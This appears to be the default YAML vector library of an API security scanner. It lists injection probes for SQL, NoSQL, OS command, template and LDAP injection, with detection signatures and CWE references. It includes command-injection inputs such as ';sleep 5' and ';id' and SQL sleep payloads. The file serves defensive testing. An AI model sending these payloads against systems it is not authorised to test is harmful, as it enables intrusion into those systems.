# Injection attack vectors (SQLi, NoSQLi, command, SSTI, LDAP).
# Embedded default library. Extend via --kb <dir>.
vectors:
  - id: sqli-error
    class: sqli
    title: SQL Injection (error-based)
    severity: high
    cwe: CWE-89
    owasp: "API8:2023 Security Misconfiguration / injection"
    description: >
      Breaks out of a SQL string/identifier context; a database error surfaced
      in the response indicates the payload reached a SQL interpreter.
    references:
      - https://owasp.org/www-community/attacks/SQL_Injection
      - https://portswigger.net/web-security/sql-injection
    applies_to:
      locations: [query, path, body, header]
      types: [string, integer, number, any]
    payloads:
      - {value: "'", technique: error}
      - {value: "\"", technique: error}
      - {value: "')--", technique: error}
      - {value: "1' OR '1'='1", technique: error}
    detection:
      error_signatures:
        - "you have an error in your sql syntax"
        - "warning: mysql"
        - "unclosed quotation mark after the character string"
        - "quoted string not properly terminated"
        - "pg_query()"
        - "psql: error"
        - "sqlite3.operationalerror"
        - "sqlstate["
        - "org.hibernate.exception"
        - "ora-00933"
        - "ora-01756"
        - "odbc sql server driver"

  - id: sqli-boolean
    class: sqli
    title: SQL Injection (boolean-based blind)
    severity: high
    cwe: CWE-89
    owasp: "API8:2023"
    description: >
      Sends a logically-true and a logically-false condition; a consistent
      difference between the two responses indicates blind SQL injection.
    references:
      - https://portswigger.net/web-security/sql-injection/blind
    applies_to:
      locations: [query, path, body]
      types: [string, integer, number, any]
    payloads:
      - {value: "' OR '1'='1", technique: boolean, note: "true"}
      - {value: "' AND '1'='2", technique: boolean, note: "false"}
    detection:
      time_threshold_ms: 0

  - id: sqli-time
    class: sqli
    title: SQL Injection (time-based blind)
    severity: high
    cwe: CWE-89
    owasp: "API8:2023"
    description: >
      Injects a database sleep; a response delayed past the baseline by the
      configured threshold indicates time-based blind SQL injection.
    references:
      - https://portswigger.net/web-security/sql-injection/blind
    applies_to:
      locations: [query, path, body]
      types: [string, integer, number, any]
    payloads:
      - {value: "1' AND SLEEP(5)-- -", technique: time, note: mysql}
      - {value: "1;SELECT pg_sleep(5)-- -", technique: time, note: postgres}
      - {value: "1' WAITFOR DELAY '0:0:5'-- -", technique: time, note: mssql}
    detection:
      time_threshold_ms: 4500

  - id: nosqli-operator
    class: nosqli
    title: NoSQL Injection (operator injection)
    severity: high
    cwe: CWE-943
    owasp: "API8:2023"
    description: >
      Injects MongoDB-style query operators to subvert authentication or
      filtering logic.
    references:
      - https://owasp.org/www-community/attacks/NoSQL_Injection
    applies_to:
      locations: [query, body]
      types: [string, any]
    payloads:
      - {value: "[$ne]=", technique: diff, note: "query-string operator"}
      - {value: "{\"$gt\":\"\"}", technique: diff, note: "json operator"}
      - {value: "'; return true; var x='", technique: error}
    detection:
      error_signatures:
        - "mongoerror"
        - "cast to objectid failed"
        - "unexpected token"

  - id: cmdi
    class: command_injection
    title: OS Command Injection
    severity: critical
    cwe: CWE-78
    owasp: "API8:2023"
    description: >
      Appends shell metacharacters and a delay/echo command; a delayed or
      reflected response indicates command execution.
    references:
      - https://owasp.org/www-community/attacks/Command_Injection
    applies_to:
      locations: [query, path, body, header]
      types: [string, any]
    payloads:
      - {value: ";sleep 5", technique: time}
      - {value: "|sleep 5", technique: time}
      - {value: "$(sleep 5)", technique: time}
      - {value: "`sleep 5`", technique: time}
      - {value: ";id", technique: error}
    detection:
      time_threshold_ms: 4500
      error_signatures:
        - "uid="
        - "gid="
        - "groups="
        - "/bin/sh"

  - id: ssti
    class: ssti
    title: Server-Side Template Injection
    severity: critical
    cwe: CWE-1336
    owasp: "API8:2023"
    description: >
      Injects template expressions; an evaluated arithmetic result in the
      response indicates template injection.
    references:
      - https://portswigger.net/research/server-side-template-injection
    applies_to:
      locations: [query, body, header]
      types: [string, any]
    payloads:
      - {value: "${{7*7}}", technique: reflection, note: "expect 49"}
      - {value: "{{7*7}}", technique: reflection, note: "expect 49"}
      - {value: "#{7*7}", technique: reflection, note: "expect 49"}
      - {value: "<%= 7*7 %>", technique: reflection, note: "expect 49"}
    detection:
      body_regex:
        - "(^|[^0-9])49([^0-9]|$)"

  - id: ldapi
    class: ldap_injection
    title: LDAP Injection
    severity: high
    cwe: CWE-90
    owasp: "API8:2023"
    description: Injects LDAP filter metacharacters to alter directory queries.
    references:
      - https://owasp.org/www-community/attacks/LDAP_Injection
    applies_to:
      locations: [query, body]
      types: [string, any]
    payloads:
      - {value: "*)(uid=*))(|(uid=*", technique: diff}
      - {value: "*", technique: diff}
    detection:
      error_signatures:
        - "ldap"
        - "invalid dn syntax"
